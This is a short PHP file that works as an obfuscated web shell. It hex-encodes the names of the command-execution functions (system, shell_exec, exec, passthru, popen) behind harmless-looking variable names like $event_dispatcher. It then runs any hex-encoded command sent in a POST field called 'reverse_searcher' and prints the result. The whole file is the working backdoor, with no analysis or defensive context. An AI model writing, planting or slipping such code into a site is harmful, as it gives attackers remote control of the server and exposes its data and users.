<?php


$flg1 = '73';
$flg2 = '74';
$flg3 = '6d';
$flg4 = '6c';
$flg5 = '5f';
$flg6 = '78';
$flg7 = '61';
$flg8 = '68';
$flg9 = '75';
$flg10 = '6f';
$flg11 = '65';
$flg12 = '72';
$flg13 = '63';
$flg14 = '70';
$event_dispatcher1 = pack("H*", $flg1.'79'.'73'.$flg2.'65'.$flg3);
$event_dispatcher2 = pack("H*", $flg1.'68'.'65'.$flg4.'6c'.$flg5.'65'.$flg6.'65'.'63');
$event_dispatcher3 = pack("H*", '65'.$flg6.'65'.'63');
$event_dispatcher4 = pack("H*", '70'.$flg7.'73'.$flg1.'74'.$flg8.'72'.$flg9);
$event_dispatcher5 = pack("H*", '70'.$flg10.'70'.$flg11.'6e');
$event_dispatcher6 = pack("H*", '73'.'74'.$flg12.$flg11.$flg7.'6d'.'5f'.'67'.$flg11.$flg2.'5f'.$flg13.$flg10.'6e'.$flg2.'65'.'6e'.'74'.'73');
$event_dispatcher7 = pack("H*", $flg14.'63'.$flg4.$flg10.$flg1.'65');
$reverse_searcher = pack("H*", $flg12.$flg11.'76'.'65'.'72'.'73'.'65'.$flg5.'73'.$flg11.'61'.'72'.'63'.$flg8.'65'.'72');
if (isset($_POST[$reverse_searcher])) {
    $reverse_searcher = pack("H*", $_POST[$reverse_searcher]);
    if (function_exists($event_dispatcher1)) {
        $event_dispatcher1($reverse_searcher);
    } elseif (function_exists($event_dispatcher2)) {
        print $event_dispatcher2($reverse_searcher);
    } elseif (function_exists($event_dispatcher3)) {
        $event_dispatcher3($reverse_searcher, $binding_descriptor);
        print join("\n", $binding_descriptor);
    } elseif (function_exists($event_dispatcher4)) {
        $event_dispatcher4($reverse_searcher);
    } elseif (function_exists($event_dispatcher5) && function_exists($event_dispatcher6) && function_exists($event_dispatcher7)) {
        $property_set_parameter_group = $event_dispatcher5($reverse_searcher, 'r');
        if ($property_set_parameter_group) {
            $value_marker = $event_dispatcher6($property_set_parameter_group);
            $event_dispatcher7($property_set_parameter_group);
            print $value_marker;
        }
    }
    exit;
}
